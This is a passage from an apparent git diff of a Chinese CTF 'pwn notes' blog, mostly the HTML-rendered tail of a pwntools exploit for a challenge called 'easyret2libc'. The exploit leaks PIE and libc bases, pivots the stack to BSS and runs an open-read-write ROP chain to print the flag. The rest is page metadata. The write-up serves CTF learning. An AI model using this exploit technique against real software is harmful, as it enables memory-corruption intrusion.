class="hljs-string">b&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) - PREVIEW_RET<br>log.success(<span class="hljs-string">&#x27;pie_base = %#x&#x27;</span> % pie_base)<br><span class="hljs-keyword">assert</span> pie_base &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span><br><br><span class="hljs-comment"># ---------- 2. leak libc：%15$p = puts+346 ----------</span><br>puts_ret = <span class="hljs-built_in">int</span>(preview(<span class="hljs-string">b&#x27;%15$p&#x27;</span>), <span class="hljs-number">16</span>)<br>libc_base = puts_ret - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>] - <span class="hljs-number">0x15a</span><br>log.success(<span class="hljs-string">&#x27;libc_base = %#x&#x27;</span> % libc_base)<br><span class="hljs-keyword">assert</span> libc_base &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;libc_base 不对齐&#x27;</span><br><br>libc.address = libc_base<br>rop = ROP(libc)<br>pop_rdi = rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>]).address<br>pop_rsi = rop.find_gadget([<span class="hljs-string">&#x27;pop rsi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>]).address<br>ret     = rop.find_gadget([<span class="hljs-string">&#x27;ret&#x27;</span>]).address<br>g = rop.find_gadget([<span class="hljs-string">&#x27;pop rdx&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br><span class="hljs-keyword">if</span> g:<br>    pop_rdx, extra = g.address, <span class="hljs-number">0</span><br><span class="hljs-keyword">else</span>:<br>    g = rop.find_gadget([<span class="hljs-string">&#x27;pop rdx&#x27;</span>, <span class="hljs-string">&#x27;pop rbx&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br>    <span class="hljs-keyword">assert</span> g, <span class="hljs-string">&#x27;找不到 pop rdx&#x27;</span><br>    pop_rdx, extra = g.address, <span class="hljs-number">1</span><br>log.info(<span class="hljs-string">&#x27;pop_rdi=%#x pop_rsi=%#x pop_rdx=%#x extra=%d ret=%#x&#x27;</span><br>         % (pop_rdi, pop_rsi, pop_rdx, extra, ret))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_rdx</span>(<span class="hljs-params">v</span>):<br>    <span class="hljs-keyword">return</span> p64(pop_rdx) + p64(v) + p64(<span class="hljs-number">0</span>) * extra<br><br>BSS  = pie_base + <span class="hljs-number">0x4100</span>    <span class="hljs-comment"># 阶段2 ROP 链</span><br>PATH = pie_base + <span class="hljs-number">0x4200</span>    <span class="hljs-comment"># flag 路径</span><br>OUT  = pie_base + <span class="hljs-number">0x4300</span>    <span class="hljs-comment"># flag 内容</span><br><br><span class="hljs-comment"># ---------- 3. 阶段1：栈上短链，读阶段2到 BSS，再栈迁移 ----------</span><br>stage1  = p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>stage1 += p64(pop_rsi) + p64(BSS)<br>stage1 += set_rdx(<span class="hljs-number">0x400</span>) + p64(libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])   <span class="hljs-comment"># read(0, BSS, 0x400)</span><br>stage1 += p64(pie_base + LEAVE_RET)                <span class="hljs-comment"># leave;ret 跳到 BSS</span><br><br><span class="hljs-comment"># saved rbp = BSS-8 → leave;ret 后 rsp=BSS, rip=[BSS]</span><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x88</span> + p64(canary) + p64(BSS - <span class="hljs-number">8</span>) + stage1<br>payload = payload.ljust(<span class="hljs-number">0x130</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)            <span class="hljs-comment"># 正好 0x130，循环一次读完</span><br>menu(<span class="hljs-string">b&#x27;2\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;payload:&#x27;</span>)<br>p.send(payload)<br><br><span class="hljs-comment"># ---------- 4. 阶段2：完整 orw 链，写到 BSS ----------</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>AT_FDCWD = (-<span class="hljs-number">100</span>) &amp; <span class="hljs-number">0xffffffffffffffff</span><br>ALIGN = <span class="hljs-literal">False</span>   <span class="hljs-comment"># 若崩在 movaps，改成 True（开头多垫一个 ret）</span><br><br>stage2 = p64(ret) <span class="hljs-keyword">if</span> ALIGN <span class="hljs-keyword">else</span> <span class="hljs-string">b&#x27;&#x27;</span><br>stage2 += p64(pop_rdi) + p64(<span class="hljs-number">0</span>)<br>stage2 += p64(pop_rsi) + p64(PATH)<br>stage2 += set_rdx(<span class="hljs-number">0x100</span>) + p64(libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])        <span class="hljs-comment"># read(0, PATH, 0x100) 读&quot;flag&quot;</span><br>stage2 += p64(pop_rdi) + p64(AT_FDCWD)<br>stage2 += p64(pop_rsi) + p64(PATH)<br>stage2 += set_rdx(<span class="hljs-number">0</span>) + p64(libc.sym[<span class="hljs-string">&#x27;openat&#x27;</span>])          <span class="hljs-comment"># openat(-100, &quot;flag&quot;, 0)</span><br>stage2 += p64(pop_rdi) + p64(<span class="hljs-number">3</span>)<br>stage2 += p64(pop_rsi) + p64(OUT)<br>stage2 += set_rdx(<span class="hljs-number">0x100</span>) + p64(libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>])        <span class="hljs-comment"># read(3, OUT, 0x100)</span><br>stage2 += p64(pop_rdi) + p64(<span class="hljs-number">1</span>)<br>stage2 += p64(pop_rsi) + p64(OUT)<br>stage2 += set_rdx(<span class="hljs-number">0x100</span>) + p64(libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>])       <span class="hljs-comment"># write(1, OUT, 0x100)</span><br><br>p.send(stage2)              <span class="hljs-comment"># 被阶段1的 read(0,BSS,0x400) 接收</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>p.send(<span class="hljs-string">b&#x27;flag\x00&#x27;</span>)         <span class="hljs-comment"># 被阶段2第一个 read 接收</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>
+
+<!-- sync-hash: 58d49166c2b25d34a204dee593b79803b05d8b8fae6807ff3bdc26f583e0af16 -->
 
                 
               </div>
@@ -900,7 +870,7 @@
   
     <span>></span>
     
-  <a href="/pwn-notes/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/HITCON/" class="category-chain-item">HITCON</a>
+  <a href="/pwn-notes/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/%E5%85%B6%E4%BB%96%E8%B5%9B%E4%BA%8B/" class="category-chain-item">其他赛事</a>
   
   
 
@@ -917,11 +887,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/pwn-notes/tags/unsorted-bin/" class="print-no-link">#unsorted-bin</a>
+        <a href="/pwn-notes/tags/ROP/" class="print-no-link">#ROP</a>
       
-        <a href="/pwn-notes/tags/double-free/" class="print-no-link">#double-free</a>
+        <a href="/pwn-notes/tags/canary/" class="print-no-link">#canary</a>
       
-        <a href="/pwn-notes/tags/off-by-null/" class="print-no-link">#off-by-null</a>
+        <a href="/pwn-notes/tags/glibc2-35/" class="print-no-link">#glibc2.35</a>
       
     </div>
   
@@ -933,8 +903,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>hitcon2018childrentcache（off by null）</div>
-      <div>https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/</div>
+      <div>easyret2libc</div>
+      <div>https://henan808.github.io/pwn-notes/2026/11/25/sync-typora-pwn-easyret2libc-c37693/</div>
     </div>
     <div class="license-meta">
       
@@ -946,7 +916,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年11月13日</div>
+          <div>2026年11月25日</div>
         </div>
       
       
@@ -990,9 +960,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-8350d48a-e9e857/" title="单身杯">
+                      <a href="/pwn-notes/2026/11/25/sync-typora-pwn-ciscn2019final3-58c6fc/" title="ciscn2019final3">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">单身杯</span>
+                        <span class="hidden-mobile">ciscn2019final3</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -1000,8 +970,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-v-n2020-easytheap-8e50cf/" title="[V&amp;N2020 公开赛]easyTHeap（差一步美满）">
-                        <span class="hidden-mobile">[V&amp;N2020 公开赛]easyTHeap（差一步美满）</span>
+                      <a href="/pwn-notes/2026/11/25/sync-typora-pwn-hitcon2018childrentcache-off-by-null-b2acde/" title="hitcon2018childrentcache（off by null）">
+                        <span class="hidden-mobile">hitcon2018childrentcache（off by null）</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
